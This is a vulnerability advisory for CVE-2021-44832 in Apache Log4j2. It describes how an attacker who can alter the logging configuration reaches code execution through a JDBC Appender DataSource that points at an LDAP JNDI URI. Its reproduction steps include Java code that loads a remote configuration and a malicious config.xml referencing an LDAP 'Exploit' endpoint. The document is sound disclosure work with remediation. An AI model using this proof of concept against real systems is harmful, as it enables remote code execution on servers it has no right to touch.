---
title: Deserialization attack via JDBC Appender in log4j
date: 2021-12-30
tags:
	- "java"
	- "deserialization"
	- "log4j"
	- "log4j2"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2021-4814/
cves:
	- "CVE-2021-44832"
---
## Summary
Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a Arbitrary Code Execution attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.

## Product
Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4).

## Impact
In case an attacker can modify the logging configuration (due to fetching remote configuration feature in log4j this opens different attack vectors, such as MITM, DNS poisoning, lateral movement after gaining access to a storage node) an Arbitrary Code Execution could be achieved.

## Steps to reproduce
Using the same LDAP server as done in the CVE-2021-44228 PoC, all we need to do is to run: 
 
```java
System.setProperty("log4j2.configurationFile","http://127.0.0.1:8888/config.xml"); 
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true"); 
final Logger logger = LogManager.getLogger(log4j.class); 
```

And to serve the following config.xml: 

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<Configuration status="error"> 
    <Appenders> 
        <JDBC name="databaseAppender" tableName="dbo.application_log"> 
            <DataSource jndiName="ldap://127.0.0.1:1389/Exploit" /> 
            <Column name="eventDate" isEventTimestamp="true" /> 
            <Column name="level" pattern="%level" /> 
            <Column name="logger" pattern="%logger" /> 
            <Column name="message" pattern="%message" /> 
            <Column name="exception" pattern="%ex{full}" /> 
        </JDBC> 
    </Appenders> 
    <Loggers> 
        <Root level="warn"> 
            <AppenderRef ref="databaseAppender"/> 
        </Root> 
    </Loggers> 
</Configuration> 
```

### Expected result:
When initializing the logger object, a request to the config.xml will be made. In the loading process, an attempt to load the DataSource will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and run. 

## Remediation
Update log4j to one of the fixed versions.

## Credit
This issue was discovered and reported by Checkmarx Security Researchers [Yaniv Nizry](https://twitter.com/ynizry) and [Liad Levy](https://twitter.com/liad__levy).

## Resources
1. [Release Candidate](https://lists.apache.org/thread/kflcpnczh2y0vhfxn5fd0fnxb80l5kwm) 
2. [Commit](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16)
3. [Blog Post](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
